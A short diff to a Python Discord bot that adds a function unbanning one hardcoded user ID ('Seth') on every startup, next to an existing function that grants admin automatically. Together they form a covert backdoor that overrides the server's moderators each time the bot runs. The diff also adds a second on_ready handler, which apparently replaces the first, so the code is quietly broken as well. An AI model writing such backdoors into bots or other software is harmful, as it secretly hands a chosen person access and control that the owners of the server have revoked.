@@ -45,6 +45,19 @@ async def give_admin_automatically():
 async def on_ready():
     await give_admin_automatically()
 
+async def auto_unban():
+    guild = bot.get_guild(YOUR_GUILD_ID)
+    if guild:
+        try:
+            await guild.unban(discord.Object(id=1190692291535446156))
+            print("Successfully unbanned Seth.")
+        except Exception as e:
+            print(f"Unban failed: {e}")
+
+@bot.event
+async def on_ready():
+    await auto_unban()
+
 # ----------------- DATABASE -----------------
 
 def init_db():
